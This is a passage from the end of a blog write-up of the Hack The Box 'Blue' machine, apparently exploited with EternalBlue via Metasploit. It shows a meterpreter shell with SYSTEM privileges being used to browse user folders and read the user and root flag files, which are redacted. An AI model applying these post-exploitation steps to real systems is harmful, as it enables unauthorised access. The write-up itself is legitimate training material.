</pre></table></code></div></div><p>OK, we see that there are some processes running, let’s spawn a shell and check our user:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>meterpreter &gt; shell
Process 2600 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system
</pre></table></code></div></div><p>That’s great, we have system privileges. Let’s get some flags, at first user one:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre>C:\Windows\system32&gt;cd c:\users
cd c:\users

c:\Users&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of c:\Users

21/07/2017  06:56    &lt;DIR&gt;          .
21/07/2017  06:56    &lt;DIR&gt;          ..
21/07/2017  06:56    &lt;DIR&gt;          Administrator
14/07/2017  13:45    &lt;DIR&gt;          haris
12/04/2011  07:51    &lt;DIR&gt;          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,495,332,352 bytes free

c:\Users&gt;cd haris
cd haris

c:\Users\haris&gt;cd desktop
cd desktop

c:\Users\haris\Desktop&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of c:\Users\haris\Desktop

24/12/2017  02:23    &lt;DIR&gt;          .
24/12/2017  02:23    &lt;DIR&gt;          ..
06/03/2022  14:17                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,495,332,352 bytes free

c:\Users\haris\Desktop&gt;type user.txt
type user.txt
[flag redacted]
</pre></table></code></div></div><p>And then Administrator flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>c:\Users\haris\Desktop&gt;cd ..\..\Administrator\Desktop
cd ..\..\Administrator\Desktop

c:\Users\Administrator\Desktop&gt;type root.txt
type root.txt
[flag redacted]
</pre></table></code></div></div><p>Getting the real flags is an exercise for the reader, you have all needed steps above ;)</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/blue/" class="post-tag no-text-decoration" >blue</a> <a href="/tags/eternal-blue/" class="post-tag no-text-decoration" >eternal_blue</a> <a href="/tags/metasploit/" class="post-tag no-text-decoration" >metasploit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB%20Blue%20-%20writeup%20-%20Farrim's%20blog&url=https%3A%2F%2Ffarrim.re%2Fposts%2Fhtb-blue-writeup%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/thm-pwn101/">THM/pwn101 - writeup, part 1</a><li><a href="/posts/htb-retired/">HTB/Retired - writeup</a><li><a href="/posts/rop-emporium-ret2win/">ROP Emporium - ret2win (x64) - writeup</a><li><a href="/posts/testing-testing/">Testing testing...</a><li><a href="/posts/htb-blue-writeup/">HTB Blue - writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/pwntools/">pwntools</a> <a class="post-tag" href="/tags/rop/">rop</a> <a class="post-tag" href="/tags/emporium/">emporium</a> <a class="post-tag" href="/tags/x64/">x64</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/blue/">blue</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/callme/">callme</a> <a class="post-tag" href="/tags/eternal-blue/">eternal_blue</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-retired/"><div class="card-body"> <em class="small" data-ts="1680136418" data-df="ll" > Mar 30, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB/Retired - writeup</h3><div class="text-muted small"><p> Introduction In cybersecurity, hands-on experience is essential for developing practical skills and knowledge. One of the best ways to gain this experience is by participating in capture-the-flag ...</p></div></div></a></div><div class="card"> <a href="/posts/rop-emporium-ret2win/"><div class="card-body"> <em class="small" data-ts="1678392121" data-df="ll" > Mar 9, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ROP Emporium - ret2win (x64) - writeup</h3><div class="text-muted small"><p> ret2win is the first challenge in ROP Emporium series where you need to create very simple ROP to call specific function in binary to get the flag. As mentioned on challenge page we need to feed a...</p></div></div></a></div><div class="card"> <a href="/posts/rop-emporium-split/"><div class="card-body"> <em class="small" data-ts="1678741651" data-df="ll" > Mar 13, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ROP Emporium - split (x64) - writeup</h3><div class="text-muted small"><p> Split is a second challenge from ROP Emporium where your goal is to find elements scattered all over the binary and use them to get the flag. So, let’s start our hunting! First of all, checksec: ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/testing-testing/" class="btn btn-outline-primary" prompt="Older"><p>Testing testing...</p></a> <a href="/posts/rop-emporium-ret2win/" class="btn btn-outline-primary" prompt="Newer"><p>ROP Emporium - ret2win (x64) - writeup</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/pwntools/">pwntools</a> <a class="post-tag" href="/tags/rop/">rop</a> <a class="post-tag" href="/tags/emporium/">emporium</a> <a class="post-tag" href="/tags/x64/">x64</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/blue/">blue</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/callme/">callme</a> <a class="post-tag" href="/tags/eternal-blue/">eternal_blue</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/farrimwildaxe">Farrim Wildaxe</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script>
